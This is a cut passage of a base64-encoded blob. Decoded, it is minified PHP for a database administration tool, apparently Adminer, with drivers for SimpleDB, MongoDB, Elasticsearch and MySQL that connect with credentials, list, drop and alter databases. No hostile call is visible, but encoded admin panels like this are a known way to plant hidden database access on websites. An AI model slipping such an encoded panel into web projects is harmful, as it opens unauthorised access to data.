jtyZXR1cm4oJGJpLT4kWGc/JGJpLT4kWGc6dHJ1ZSk7fWZ1bmN0aW9uDQpzZGJfcmVxdWVzdF9hbGwoJHVhLCRYZywkRj1hcnJheSgpLCRnaD0wKXskSj1hcnJheSgpOyRFZz0oJGdoP21pY3JvdGltZSh0cnVlKTowKTskej0ocHJlZ19tYXRjaCgnfkxJTUlUXHMrKFxkKylccyokfmknLCRGWydTZWxlY3RFeHByZXNzaW9uJ10sJEIpPyRCWzFdOjApO2RveyRiaT1zZGJfcmVxdWVzdCgkdWEsJEYpO2lmKCEkYmkpYnJlYWs7Zm9yZWFjaCgkYmktPiRYZw0KYXMkZ2MpJEpbXT0kZ2M7aWYoJHomJmNvdW50KCRKKT49JHopeyRfR0VUWyJuZXh0Il09JGJpLT5OZXh0VG9rZW47YnJlYWs7fWlmKCRnaCYmbWljcm90aW1lKHRydWUpLSRFZz4kZ2gpcmV0dXJuDQpmYWxzZTskRlsnTmV4dFRva2VuJ109JGJpLT5OZXh0VG9rZW47aWYoJHopJEZbJ1NlbGVjdEV4cHJlc3Npb24nXT1wcmVnX3JlcGxhY2UoJ35cZCtccyokficsJHotY291bnQoJEopLCRGWydTZWxlY3RFeHByZXNzaW9uJ10pO313aGlsZSgkYmktPk5leHRUb2tlbik7cmV0dXJuJEo7fSR3PSJzaW1wbGVkYiI7JE9lPWFycmF5KCI9IiwiPCIsIj4iLCI8PSIsIj49IiwiIT0iLCJMSUtFIiwiTElLRSAlJSIsIklOIiwiSVMgTlVMTCIsIk5PVCBMSUtFIiwiSVMgTk9UIE5VTEwiKTskU2M9YXJyYXkoKTskWGM9YXJyYXkoImNvdW50Iik7JGRjPWFycmF5KGFycmF5KCJqc29uIikpO30kVmJbIm1vbmdvIl09Ik1vbmdvREIgKGJldGEpIjtpZihpc3NldCgkX0dFVFsibW9uZ28iXSkpeyR3Zj1hcnJheSgibW9uZ28iKTtkZWZpbmUoIkRSSVZFUiIsIm1vbmdvIik7aWYoY2xhc3NfZXhpc3RzKCdNb25nb0RCJykpe2NsYXNzDQpNaW5fREJ7dmFyJGV4dGVuc2lvbj0iTW9uZ28iLCRlcnJvciwkbGFzdF9pZCwkX2xpbmssJF9kYjtmdW5jdGlvbg0KY29ubmVjdCgkTiwkViwkRyl7Z2xvYmFsJGI7JG09JGItPmRhdGFiYXNlKCk7JFJlPWFycmF5KCk7aWYoJFYhPSIiKXskUmVbInVzZXJuYW1lIl09JFY7JFJlWyJwYXNzd29yZCJdPSRHO31pZigkbSE9IiIpJFJlWyJkYiJdPSRtO3RyeXskdGhpcy0+X2xpbms9QG5ldw0KTW9uZ29DbGllbnQoIm1vbmdvZGI6Ly8kTiIsJFJlKTtyZXR1cm4NCnRydWU7fWNhdGNoKEV4Y2VwdGlvbiRzYyl7JHRoaXMtPmVycm9yPSRzYy0+Z2V0TWVzc2FnZSgpO3JldHVybg0KZmFsc2U7fX1mdW5jdGlvbg0KcXVlcnkoJEgpe3JldHVybg0KZmFsc2U7fWZ1bmN0aW9uDQpzZWxlY3RfZGIoJGspe3RyeXskdGhpcy0+X2RiPSR0aGlzLT5fbGluay0+c2VsZWN0REIoJGspO3JldHVybg0KdHJ1ZTt9Y2F0Y2goRXhjZXB0aW9uJHNjKXskdGhpcy0+ZXJyb3I9JHNjLT5nZXRNZXNzYWdlKCk7cmV0dXJuDQpmYWxzZTt9fWZ1bmN0aW9uDQpxdW90ZSgkUCl7cmV0dXJuJFA7fX1jbGFzcw0KTWluX1Jlc3VsdHt2YXIkbnVtX3Jvd3MsJF9yb3dzPWFycmF5KCksJF9vZmZzZXQ9MCwkX2NoYXJzZXQ9YXJyYXkoKTtmdW5jdGlvbg0KX19jb25zdHJ1Y3QoJEkpe2ZvcmVhY2goJEkNCmFzJENkKXskSz1hcnJheSgpO2ZvcmVhY2goJENkDQphcyR4PT4kWCl7aWYoaXNfYSgkWCwnTW9uZ29CaW5EYXRhJykpJHRoaXMtPl9jaGFyc2V0WyR4XT02MzskS1skeF09KGlzX2EoJFgsJ01vbmdvSWQnKT8nT2JqZWN0SWQoIicuc3RydmFsKCRYKS4nIiknOihpc19hKCRYLCdNb25nb0RhdGUnKT9nbWRhdGUoIlktbS1kIEg6aTpzIiwkWC0+c2VjKS4iIEdNVCI6KGlzX2EoJFgsJ01vbmdvQmluRGF0YScpPyRYLT5iaW46KGlzX2EoJFgsJ01vbmdvUmVnZXgnKT9zdHJ2YWwoJFgpOihpc19vYmplY3QoJFgpP2dldF9jbGFzcygkWCk6JFgpKSkpKTt9JHRoaXMtPl9yb3dzW109JEs7Zm9yZWFjaCgkSw0KYXMkeD0+JFgpe2lmKCFpc3NldCgkdGhpcy0+X3Jvd3NbMF1bJHhdKSkkdGhpcy0+X3Jvd3NbMF1bJHhdPW51bGw7fX0kdGhpcy0+bnVtX3Jvd3M9Y291bnQoJHRoaXMtPl9yb3dzKTt9ZnVuY3Rpb24NCmZldGNoX2Fzc29jKCl7JEs9Y3VycmVudCgkdGhpcy0+X3Jvd3MpO2lmKCEkSylyZXR1cm4kSzskSj1hcnJheSgpO2ZvcmVhY2goJHRoaXMtPl9yb3dzWzBdYXMkeD0+JFgpJEpbJHhdPSRLWyR4XTtuZXh0KCR0aGlzLT5fcm93cyk7cmV0dXJuJEo7fWZ1bmN0aW9uDQpmZXRjaF9yb3coKXskSj0kdGhpcy0+ZmV0Y2hfYXNzb2MoKTtpZighJEopcmV0dXJuJEo7cmV0dXJuDQphcnJheV92YWx1ZXMoJEopO31mdW5jdGlvbg0KZmV0Y2hfZmllbGQoKXskSWQ9YXJyYXlfa2V5cygkdGhpcy0+X3Jvd3NbMF0pOyRDPSRJZFskdGhpcy0+X29mZnNldCsrXTtyZXR1cm4ob2JqZWN0KWFycmF5KCduYW1lJz0+JEMsJ2NoYXJzZXRucic9PiR0aGlzLT5fY2hhcnNldFskQ10sKTt9fX1jbGFzcw0KTWluX0RyaXZlcg0KZXh0ZW5kcw0KTWluX1NRTHtwdWJsaWMkemY9Il9pZCI7ZnVuY3Rpb24NCnNlbGVjdCgkUSwkTSwkWiwkVmMsJFRlPWFycmF5KCksJHo9MSwkRT0wLCRBZj1mYWxzZSl7JE09KCRNPT1hcnJheSgiKiIpP2FycmF5KCk6YXJyYXlfZmlsbF9rZXlzKCRNLHRydWUpKTskX2c9YXJyYXkoKTtmb3JlYWNoKCRUZQ0KYXMkWCl7JFg9cHJlZ19yZXBsYWNlKCd+IERFU0MkficsJycsJFgsMSwkX2IpOyRfZ1skWF09KCRfYj8tMToxKTt9cmV0dXJuDQpuZXcNCk1pbl9SZXN1bHQoJHRoaXMtPl9jb25uLT5fZGItPnNlbGVjdENvbGxlY3Rpb24oJFEpLT5maW5kKGFycmF5KCksJE0pLT5zb3J0KCRfZyktPmxpbWl0KCskeiktPnNraXAoJEUqJHopKTt9ZnVuY3Rpb24NCmluc2VydCgkUSwkTyl7dHJ5eyRKPSR0aGlzLT5fY29ubi0+X2RiLT5zZWxlY3RDb2xsZWN0aW9uKCRRKS0+aW5zZXJ0KCRPKTskdGhpcy0+X2Nvbm4tPmVycm5vPSRKWydjb2RlJ107JHRoaXMtPl9jb25uLT5lcnJvcj0kSlsnZXJyJ107JHRoaXMtPl9jb25uLT5sYXN0X2lkPSRPWydfaWQnXTtyZXR1cm4hJEpbJ2VyciddO31jYXRjaChFeGNlcHRpb24kc2MpeyR0aGlzLT5fY29ubi0+ZXJyb3I9JHNjLT5nZXRNZXNzYWdlKCk7cmV0dXJuDQpmYWxzZTt9fX1mdW5jdGlvbg0KY29ubmVjdCgpe2dsb2JhbCRiOyRnPW5ldw0KTWluX0RCOyRqPSRiLT5jcmVkZW50aWFscygpO2lmKCRnLT5jb25uZWN0KCRqWzBdLCRqWzFdLCRqWzJdKSlyZXR1cm4kZztyZXR1cm4kZy0+ZXJyb3I7fWZ1bmN0aW9uDQplcnJvcigpe2dsb2JhbCRnO3JldHVybg0KaCgkZy0+ZXJyb3IpO31mdW5jdGlvbg0KbG9nZ2VkX3VzZXIoKXtnbG9iYWwkYjskaj0kYi0+Y3JlZGVudGlhbHMoKTtyZXR1cm4kalsxXTt9ZnVuY3Rpb24NCmdldF9kYXRhYmFzZXMoJEpjKXtnbG9iYWwkZzskSj1hcnJheSgpOyRIYj0kZy0+X2xpbmstPmxpc3REQnMoKTtmb3JlYWNoKCRIYlsnZGF0YWJhc2VzJ11hcyRtKSRKW109JG1bJ25hbWUnXTtyZXR1cm4kSjt9ZnVuY3Rpb24NCmNvbGxhdGlvbnMoKXtyZXR1cm4NCmFycmF5KCk7fWZ1bmN0aW9uDQpkYl9jb2xsYXRpb24oJG0sJG1iKXt9ZnVuY3Rpb24NCmNvdW50X3RhYmxlcygkbCl7Z2xvYmFsJGc7JEo9YXJyYXkoKTtmb3JlYWNoKCRsDQphcyRtKSRKWyRtXT1jb3VudCgkZy0+X2xpbmstPnNlbGVjdERCKCRtKS0+Z2V0Q29sbGVjdGlvbk5hbWVzKHRydWUpKTtyZXR1cm4kSjt9ZnVuY3Rpb24NCnRhYmxlc19saXN0KCl7Z2xvYmFsJGc7cmV0dXJuDQphcnJheV9maWxsX2tleXMoJGctPl9kYi0+Z2V0Q29sbGVjdGlvbk5hbWVzKHRydWUpLCd0YWJsZScpO31mdW5jdGlvbg0KdGFibGVfc3RhdHVzKCRDPSIiLCRDYz1mYWxzZSl7JEo9YXJyYXkoKTtmb3JlYWNoKHRhYmxlc19saXN0KClhcyRRPT4kVSl7JEpbJFFdPWFycmF5KCJOYW1lIj0+JFEpO2lmKCRDPT0kUSlyZXR1cm4kSlskUV07fXJldHVybiRKO31mdW5jdGlvbg0KaW5mb3JtYXRpb25fc2NoZW1hKCl7fWZ1bmN0aW9uDQppc192aWV3KCRSKXt9ZnVuY3Rpb24NCmRyb3BfZGF0YWJhc2VzKCRsKXtnbG9iYWwkZztmb3JlYWNoKCRsDQphcyRtKXskWWY9JGctPl9saW5rLT5zZWxlY3REQigkbSktPmRyb3AoKTtpZighJFlmWydvayddKXJldHVybg0KZmFsc2U7fXJldHVybg0KdHJ1ZTt9ZnVuY3Rpb24NCmluZGV4ZXMoJFEsJGg9bnVsbCl7Z2xvYmFsJGc7JEo9YXJyYXkoKTtmb3JlYWNoKCRnLT5fZGItPnNlbGVjdENvbGxlY3Rpb24oJFEpLT5nZXRJbmRleEluZm8oKWFzJHUpeyROYj1hcnJheSgpO2ZvcmVhY2goJHVbImtleSJdYXMkZT0+JFUpJE5iW109KCRVPT0tMT8nMSc6bnVsbCk7JEpbJHVbIm5hbWUiXV09YXJyYXkoInR5cGUiPT4oJHVbIm5hbWUiXT09Il9pZF8iPyJQUklNQVJZIjooJHVbInVuaXF1ZSJdPyJVTklRVUUiOiJJTkRFWCIpKSwiY29sdW1ucyI9PmFycmF5X2tleXMoJHVbImtleSJdKSwibGVuZ3RocyI9PmFycmF5KCksImRlc2NzIj0+JE5iLCk7fXJldHVybiRKO31mdW5jdGlvbg0KZmllbGRzKCRRKXtyZXR1cm4NCmZpZWxkc19mcm9tX2VkaXQoKTt9ZnVuY3Rpb24NCmNvbnZlcnRfZmllbGQoJG8pe31mdW5jdGlvbg0KdW5jb252ZXJ0X2ZpZWxkKCRvLCRKKXtyZXR1cm4kSjt9ZnVuY3Rpb24NCmZvcmVpZ25fa2V5cygkUSl7cmV0dXJuDQphcnJheSgpO31mdW5jdGlvbg0KZmtfc3VwcG9ydCgkUil7fWZ1bmN0aW9uDQplbmdpbmVzKCl7cmV0dXJuDQphcnJheSgpO31mdW5jdGlvbg0KZm91bmRfcm93cygkUiwkWil7Z2xvYmFsJGc7cmV0dXJuJGctPl9kYi0+c2VsZWN0Q29sbGVjdGlvbigkX0dFVFsic2VsZWN0Il0pLT5jb3VudCgkWik7fWZ1bmN0aW9uDQphbHRlcl90YWJsZSgkUSwkQywkcCwkS2MsJHFiLCRsYywkZCwkS2EsJGtmKXtnbG9iYWwkZztpZigkUT09IiIpeyRnLT5fZGItPmNyZWF0ZUNvbGxlY3Rpb24oJEMpO3JldHVybg0KdHJ1ZTt9fWZ1bmN0aW9uDQpkcm9wX3RhYmxlcygkUyl7Z2xvYmFsJGc7Zm9yZWFjaCgkUw0KYXMkUSl7JFlmPSRnLT5fZGItPnNlbGVjdENvbGxlY3Rpb24oJFEpLT5kcm9wKCk7aWYoISRZZlsnb2snXSlyZXR1cm4NCmZhbHNlO31yZXR1cm4NCnRydWU7fWZ1bmN0aW9uDQp0cnVuY2F0ZV90YWJsZXMoJFMpe2dsb2JhbCRnO2ZvcmVhY2goJFMNCmFzJFEpeyRZZj0kZy0+X2RiLT5zZWxlY3RDb2xsZWN0aW9uKCRRKS0+cmVtb3ZlKCk7aWYoISRZZlsnb2snXSlyZXR1cm4NCmZhbHNlO31yZXR1cm4NCnRydWU7fWZ1bmN0aW9uDQphbHRlcl9pbmRleGVzKCRRLCRjKXtnbG9iYWwkZztmb3JlYWNoKCRjDQphcyRYKXtsaXN0KCRVLCRDLCRPKT0kWDtpZigkTz09IkRST1AiKSRKPSRnLT5fZGItPmNvbW1hbmQoYXJyYXkoImRlbGV0ZUluZGV4ZXMiPT4kUSwiaW5kZXgiPT4kQykpO2Vsc2V7JGY9YXJyYXkoKTtmb3JlYWNoKCRPDQphcyRlKXskZT1wcmVnX3JlcGxhY2UoJ34gREVTQyR+JywnJywkZSwxLCRfYik7JGZbJGVdPSgkX2I/LTE6MSk7fSRKPSRnLT5fZGItPnNlbGVjdENvbGxlY3Rpb24oJFEpLT5lbnN1cmVJbmRleCgkZixhcnJheSgidW5pcXVlIj0+KCRVPT0iVU5JUVVFIiksIm5hbWUiPT4kQywpKTt9aWYoJEpbJ2Vycm1zZyddKXskZy0+ZXJyb3I9JEpbJ2Vycm1zZyddO3JldHVybg0KZmFsc2U7fX1yZXR1cm4NCnRydWU7fWZ1bmN0aW9uDQpsYXN0X2lkKCl7Z2xvYmFsJGc7cmV0dXJuJGctPmxhc3RfaWQ7fWZ1bmN0aW9uDQp0YWJsZSgkdCl7cmV0dXJuJHQ7fWZ1bmN0aW9uDQppZGZfZXNjYXBlKCR0KXtyZXR1cm4kdDt9ZnVuY3Rpb24NCnN1cHBvcnQoJERjKXtyZXR1cm4NCnByZWdfbWF0Y2goIn5kYXRhYmFzZXxpbmRleGVzfiIsJERjKTt9JHc9Im1vbmdvIjskT2U9YXJyYXkoIj0iKTskU2M9YXJyYXkoKTskWGM9YXJyYXkoKTskZGM9YXJyYXkoYXJyYXkoImpzb24iKSk7fSRWYlsiZWxhc3RpYyJdPSJFbGFzdGljc2VhcmNoIChiZXRhKSI7aWYoaXNzZXQoJF9HRVRbImVsYXN0aWMiXSkpeyR3Zj1hcnJheSgianNvbiIpO2RlZmluZSgiRFJJVkVSIiwiZWxhc3RpYyIpO2lmKGZ1bmN0aW9uX2V4aXN0cygnanNvbl9kZWNvZGUnKSl7Y2xhc3MNCk1pbl9EQnt2YXIkZXh0ZW5zaW9uPSJKU09OIiwkc2VydmVyX2luZm8sJGVycm5vLCRlcnJvciwkX3VybDtmdW5jdGlvbg0Kcm9vdFF1ZXJ5KCRuZiwkdmI9YXJyYXkoKSwkb2U9J0dFVCcpe0Bpbmlfc2V0KCd0cmFja19lcnJvcnMnLDEpOyRGYz1AZmlsZV9nZXRfY29udGVudHMoJHRoaXMtPl91cmwuJy8nLmx0cmltKCRuZiwnLycpLGZhbHNlLHN0cmVhbV9jb250ZXh0X2NyZWF0ZShhcnJheSgnaHR0cCc9PmFycmF5KCdtZXRob2QnPT4kb2UsJ2NvbnRlbnQnPT5qc29uX2VuY29kZSgkdmIpLCdpZ25vcmVfZXJyb3JzJz0+MSwpKSkpO2lmKCEkRmMpeyR0aGlzLT5lcnJvcj0kcGhwX2Vycm9ybXNnO3JldHVybiRGYzt9aWYoIXByZWdfbWF0Y2goJ35eSFRUUC9bMC05Ll0rIDJ+aScsJGh0dHBfcmVzcG9uc2VfaGVhZGVyWzBdKSl7JHRoaXMtPmVycm9yPSRGYztyZXR1cm4NCmZhbHNlO30kSj1qc29uX2RlY29kZSgkRmMsdHJ1ZSk7aWYoJEo9PT1udWxsKXskdGhpcy0+ZXJybm89anNvbl9sYXN0X2Vycm9yKCk7aWYoZnVuY3Rpb25fZXhpc3RzKCdqc29uX2xhc3RfZXJyb3JfbXNnJykpJHRoaXMtPmVycm9yPWpzb25fbGFzdF9lcnJvcl9tc2coKTtlbHNleyR1Yj1nZXRfZGVmaW5lZF9jb25zdGFudHModHJ1ZSk7Zm9yZWFjaCgkdWJbJ2pzb24nXWFzJEM9PiRZKXtpZigkWT09JHRoaXMtPmVycm5vJiZwcmVnX21hdGNoKCd+XkpTT05fRVJST1JfficsJEMpKXskdGhpcy0+ZXJyb3I9JEM7YnJlYWs7fX19fXJldHVybiRKO31mdW5jdGlvbg0KcXVlcnkoJG5mLCR2Yj1hcnJheSgpLCRvZT0nR0VUJyl7cmV0dXJuJHRoaXMtPnJvb3RRdWVyeSgoJHRoaXMtPl9kYiE9IiI/IiR0aGlzLT5fZGIvIjoiLyIpLmx0cmltKCRuZiwnLycpLCR2Yiwkb2UpO31mdW5jdGlvbg0KY29ubmVjdCgkTiwkViwkRyl7JHRoaXMtPl91cmw9Imh0dHA6Ly8kVjokR0AkTi8iOyRKPSR0aGlzLT5xdWVyeSgnJyk7aWYoJEopJHRoaXMtPnNlcnZlcl9pbmZvPSRKWyd2ZXJzaW9uJ11bJ251bWJlciddO3JldHVybihib29sKSRKO31mdW5jdGlvbg0Kc2VsZWN0X2RiKCRrKXskdGhpcy0+X2RiPSRrO3JldHVybg0KdHJ1ZTt9ZnVuY3Rpb24NCnF1b3RlKCRQKXtyZXR1cm4kUDt9fWNsYXNzDQpNaW5fUmVzdWx0e3ZhciRudW1fcm93cywkX3Jvd3M7ZnVuY3Rpb24NCl9fY29uc3RydWN0KCRMKXskdGhpcy0+bnVtX3Jvd3M9Y291bnQoJHRoaXMtPl9yb3dzKTskdGhpcy0+X3Jvd3M9JEw7cmVzZXQoJHRoaXMtPl9yb3dzKTt9ZnVuY3Rpb24NCmZldGNoX2Fzc29jKCl7JEo9Y3VycmVudCgkdGhpcy0+X3Jvd3MpO25leHQoJHRoaXMtPl9yb3dzKTtyZXR1cm4kSjt9ZnVuY3Rpb24NCmZldGNoX3Jvdygpe3JldHVybg0KYXJyYXlfdmFsdWVzKCR0aGlzLT5mZXRjaF9hc3NvYygpKTt9fX1jbGFzcw0KTWluX0RyaXZlcg0KZXh0ZW5kcw0KTWluX1NRTHtmdW5jdGlvbg0Kc2VsZWN0KCRRLCRNLCRaLCRWYywkVGU9YXJyYXkoKSwkej0xLCRFPTAsJEFmPWZhbHNlKXtnbG9iYWwkYjskRGI9YXJyYXkoKTskSD0iJFEvX3NlYXJjaCI7aWYoJE0hPWFycmF5KCIqIikpJERiWyJmaWVsZHMiXT0kTTtpZigkVGUpeyRfZz1hcnJheSgpO2ZvcmVhY2goJFRlDQphcyRrYil7JGtiPXByZWdfcmVwbGFjZSgnfiBERVNDJH4nLCcnLCRrYiwxLCRfYik7JF9nW109KCRfYj9hcnJheSgka2I9PiJkZXNjIik6JGtiKTt9JERiWyJzb3J0Il09JF9nO31pZigkeil7JERiWyJzaXplIl09KyR6O2lmKCRFKSREYlsiZnJvbSJdPSgkRSokeik7fWZvcmVhY2goJFoNCmFzJFgpe2xpc3QoJGtiLCRNZSwkWCk9ZXhwbG9kZSgiICIsJFgsMyk7aWYoJGtiPT0iX2lkIikkRGJbInF1ZXJ5Il1bImlkcyJdWyJ2YWx1ZXMiXVtdPSRYO2Vsc2VpZigka2IuJFghPSIiKXskYmg9YXJyYXkoInRlcm0iPT5hcnJheSgoJGtiIT0iIj8ka2I6Il9hbGwiKT0+JFgpKTtpZigkTWU9PSI9IikkRGJbInF1ZXJ5Il1bImZpbHRlcmVkIl1bImZpbHRlciJdWyJhbmQiXVtdPSRiaDtlbHNlJERiWyJxdWVyeSJdWyJmaWx0ZXJlZCJdWyJxdWVyeSJdWyJib29sIl1bIm11c3QiXVtdPSRiaDt9fWlmKCREYlsicXVlcnkiXSYmISREYlsicXVlcnkiXVsiZmlsdGVyZWQiXVsicXVlcnkiXSYmISREYlsicXVlcnkiXVsiaWRzIl0pJERiWyJxdWVyeSJdWyJmaWx0ZXJlZCJdWyJxdWVyeSJdPWFycmF5KCJtYXRjaF9hbGwiPT5hcnJheSgpKTskRWc9bWljcm90aW1lKHRydWUpOyRtZz0kdGhpcy0+X2Nvbm4tPnF1ZXJ5KCRILCREYik7aWYoJEFmKWVjaG8kYi0+c2VsZWN0UXVlcnkoIiRIOiAiLnByaW50X3IoJERiLHRydWUpLGZvcm1hdF90aW1lKCRFZykpO2lmKCEkbWcpcmV0dXJuDQpmYWxzZTskSj1hcnJheSgpO2ZvcmVhY2goJG1nWydoaXRzJ11bJ2hpdHMnXWFzJGVkKXskSz1hcnJheSgpO2lmKCRNPT1hcnJheSgiKiIpKSRLWyJfaWQiXT0kZWRbIl9pZCJdOyRwPSRlZFsnX3NvdXJjZSddO2lmKCRNIT1hcnJheSgiKiIpKXskcD1hcnJheSgpO2ZvcmVhY2goJE0NCmFzJHgpJHBbJHhdPSRlZFsnZmllbGRzJ11bJHhdO31mb3JlYWNoKCRwDQphcyR4PT4kWCl7aWYoJERiWyJmaWVsZHMiXSkkWD0kWFswXTskS1skeF09KGlzX2FycmF5KCRYKT9qc29uX2VuY29kZSgkWCk6JFgpO30kSltdPSRLO31yZXR1cm4NCm5ldw0KTWluX1Jlc3VsdCgkSik7fX1mdW5jdGlvbg0KY29ubmVjdCgpe2dsb2JhbCRiOyRnPW5ldw0KTWluX0RCOyRqPSRiLT5jcmVkZW50aWFscygpO2lmKCRnLT5jb25uZWN0KCRqWzBdLCRqWzFdLCRqWzJdKSlyZXR1cm4kZztyZXR1cm4kZy0+ZXJyb3I7fWZ1bmN0aW9uDQpzdXBwb3J0KCREYyl7cmV0dXJuDQpwcmVnX21hdGNoKCJ+ZGF0YWJhc2V8dGFibGV8Y29sdW1uc34iLCREYyk7fWZ1bmN0aW9uDQpsb2dnZWRfdXNlcigpe2dsb2JhbCRiOyRqPSRiLT5jcmVkZW50aWFscygpO3JldHVybiRqWzFdO31mdW5jdGlvbg0KZ2V0X2RhdGFiYXNlcygpe2dsb2JhbCRnOyRKPSRnLT5yb290UXVlcnkoJ19hbGlhc2VzJyk7aWYoJEopeyRKPWFycmF5X2tleXMoJEopO3NvcnQoJEosU09SVF9TVFJJTkcpO31yZXR1cm4kSjt9ZnVuY3Rpb24NCmNvbGxhdGlvbnMoKXtyZXR1cm4NCmFycmF5KCk7fWZ1bmN0aW9uDQpkYl9jb2xsYXRpb24oJG0sJG1iKXt9ZnVuY3Rpb24NCmVuZ2luZXMoKXtyZXR1cm4NCmFycmF5KCk7fWZ1bmN0aW9uDQpjb3VudF90YWJsZXMoJGwpe2dsb2JhbCRnOyRKPSRnLT5xdWVyeSgnX21hcHBpbmcnKTtpZigkSikkSj1hcnJheV9tYXAoJ2NvdW50JywkSik7cmV0dXJuJEo7fWZ1bmN0aW9uDQp0YWJsZXNfbGlzdCgpe2dsb2JhbCRnOyRKPSRnLT5xdWVyeSgnX21hcHBpbmcnKTtpZigkSikkSj1hcnJheV9maWxsX2tleXMoYXJyYXlfa2V5cygkSlskZy0+X2RiXVsibWFwcGluZ3MiXSksJ3RhYmxlJyk7cmV0dXJuJEo7fWZ1bmN0aW9uDQp0YWJsZV9zdGF0dXMoJEM9IiIsJENjPWZhbHNlKXtnbG9iYWwkZzskbWc9JGctPnF1ZXJ5KCJfc2VhcmNoP3NlYXJjaF90eXBlPWNvdW50IixhcnJheSgiZmFjZXRzIj0+YXJyYXkoImNvdW50X2J5X3R5cGUiPT5hcnJheSgidGVybXMiPT5hcnJheSgiZmllbGQiPT4iX3R5cGUiLCkpKSksIlBPU1QiKTskSj1hcnJheSgpO2lmKCRtZyl7Zm9yZWFjaCgkbWdbImZhY2V0cyJdWyJjb3VudF9ieV90eXBlIl1bInRlcm1zIl1hcyRRKSRKWyRRWyJ0ZXJtIl1dPWFycmF5KCJOYW1lIj0+JFFbInRlcm0iXSwiRW5naW5lIj0+InRhYmxlIiwiUm93cyI9PiRRWyJjb3VudCJdLCk7aWYoJEMhPSIiJiYkQz09JFFbInRlcm0iXSlyZXR1cm4kSlskQ107fXJldHVybiRKO31mdW5jdGlvbg0KZXJyb3IoKXtnbG9iYWwkZztyZXR1cm4NCmgoJGctPmVycm9yKTt9ZnVuY3Rpb24NCmluZm9ybWF0aW9uX3NjaGVtYSgpe31mdW5jdGlvbg0KaXNfdmlldygkUil7fWZ1bmN0aW9uDQppbmRleGVzKCRRLCRoPW51bGwpe3JldHVybg0KYXJyYXkoYXJyYXkoInR5cGUiPT4iUFJJTUFSWSIsImNvbHVtbnMiPT5hcnJheSgiX2lkIikpLCk7fWZ1bmN0aW9uDQpmaWVsZHMoJFEpe2dsb2JhbCRnOyRJPSRnLT5xdWVyeSgiJFEvX21hcHBpbmciKTskSj1hcnJheSgpO2lmKCRJKXskWWQ9JElbJFFdWydwcm9wZXJ0aWVzJ107aWYoISRZZCkkWWQ9JElbJGctPl9kYl1bJ21hcHBpbmdzJ11bJFFdWydwcm9wZXJ0aWVzJ107aWYoJFlkKXtmb3JlYWNoKCRZZA0KYXMkQz0+JG8peyRKWyRDXT1hcnJheSgiZmllbGQiPT4kQywiZnVsbF90eXBlIj0+JG9bInR5cGUiXSwidHlwZSI9PiRvWyJ0eXBlIl0sInByaXZpbGVnZXMiPT5hcnJheSgiaW5zZXJ0Ij0+MSwic2VsZWN0Ij0+MSwidXBkYXRlIj0+MSksKTtpZigkb1sicHJvcGVydGllcyJdKXt1bnNldCgkSlskQ11bInByaXZpbGVnZXMiXVsiaW5zZXJ0Il0pO3Vuc2V0KCRKWyRDXVsicHJpdmlsZWdlcyJdWyJ1cGRhdGUiXSk7fX19fXJldHVybiRKO31mdW5jdGlvbg0KZm9yZWlnbl9rZXlzKCRRKXtyZXR1cm4NCmFycmF5KCk7fWZ1bmN0aW9uDQp0YWJsZSgkdCl7cmV0dXJuJHQ7fWZ1bmN0aW9uDQppZGZfZXNjYXBlKCR0KXtyZXR1cm4kdDt9ZnVuY3Rpb24NCmNvbnZlcnRfZmllbGQoJG8pe31mdW5jdGlvbg0KdW5jb252ZXJ0X2ZpZWxkKCRvLCRKKXtyZXR1cm4kSjt9ZnVuY3Rpb24NCmZrX3N1cHBvcnQoJFIpe31mdW5jdGlvbg0KZm91bmRfcm93cygkUiwkWil7cmV0dXJuDQpudWxsO31mdW5jdGlvbg0KY3JlYXRlX2RhdGFiYXNlKCRtKXtnbG9iYWwkZztyZXR1cm4kZy0+cm9vdFF1ZXJ5KHVybGVuY29kZSgkbSksYXJyYXkoKSwnUFVUJyk7fWZ1bmN0aW9uDQpkcm9wX2RhdGFiYXNlcygkbCl7Z2xvYmFsJGc7cmV0dXJuJGctPnJvb3RRdWVyeSh1cmxlbmNvZGUoaW1wbG9kZSgnLCcsJGwpKSxhcnJheSgpLCdERUxFVEUnKTt9ZnVuY3Rpb24NCmRyb3BfdGFibGVzKCRTKXtnbG9iYWwkZzskSj10cnVlO2ZvcmVhY2goJFMNCmFzJFEpJEo9JEomJiRnLT5xdWVyeSh1cmxlbmNvZGUoJFEpLGFycmF5KCksJ0RFTEVURScpO3JldHVybiRKO30kdz0iZWxhc3RpYyI7JE9lPWFycmF5KCI9IiwicXVlcnkiKTskU2M9YXJyYXkoKTskWGM9YXJyYXkoKTskZGM9YXJyYXkoYXJyYXkoImpzb24iKSk7fSRWYj1hcnJheSgic2VydmVyIj0+Ik15U1FMIikrJFZiO2lmKCFkZWZpbmVkKCJEUklWRVIiKSl7JHdmPWFycmF5KCJNeVNRTGkiLCJNeVNRTCIsIlBET19NeVNRTCIpO2RlZmluZSgiRFJJVkVSIiwic2VydmVyIik7aWYoZXh0ZW5zaW9uX2xvYWRlZCgibXlzcWxpIikpe2NsYXNzDQpNaW5fREINCmV4dGVuZHMNCk15U1FMaXt2YXIkZXh0ZW5zaW9uPSJNeVNRTGkiO2Z1bmN0aW9uDQpfX2NvbnN0cnVjdCgpe3BhcmVudDo6aW5pdCgpO31mdW5jdGlvbg0KY29ubmVjdCgkTj0iIiwkVj0iIiwkRz0iIiwkaz1udWxsLCRzZj1udWxsLCR6Zz1udWxsKXtteXNxbGlfcmVwb3J0KE1ZU1FMSV9SRVBPUlRfT0ZGKTtsaXN0KCRmZCwkc2YpPWV4cGxvZGUoIjoiLCROLDIpOyRKPUAkdGhpcy0+cmVhbF9jb25uZWN0KCgkTiE9IiI/JGZkOmluaV9nZXQoIm15c3FsaS5kZWZhdWx0X2hvc3QiKSksKCROLiRWIT0iIj8kVjppbmlfZ2V0KCJteXNxbGkuZGVmYXVsdF91c2VyIikpLCgkTi4kVi4kRyE9IiI/JEc6aW5pX2dldCgibXlzcWxpLmRlZmF1bHRfcHciKSksJGssKGlzX251bWVyaWMoJHNmKT8kc2Y6aW5pX2dldCgibXlzcWxpLmRlZmF1bHRfcG9ydCIpKSwoIWlzX251bWVyaWMoJHNmKT8kc2Y6JHpnKSk7cmV0dXJuJEo7fWZ1bmN0aW9uDQpzZXRfY2hhcnNldCgkWmEpe2lmKHBhcmVudDo6c2V0X2NoYXJzZXQoJFphKSlyZXR1cm4NCnRydWU7cGFyZW50OjpzZXRfY2hhcnNldCgndXRmOCcpO3JldHVybiR0aGlzLT5xdWVyeSgiU0VUIE5BTUVTICRaYSIpO31mdW5jdGlvbg0KcmVzdWx0KCRILCRvPTApeyRJPSR0aGlzLT5xdWVyeSgkSCk7aWYoISRJKXJldHVybg0KZmFsc2U7JEs9JEktP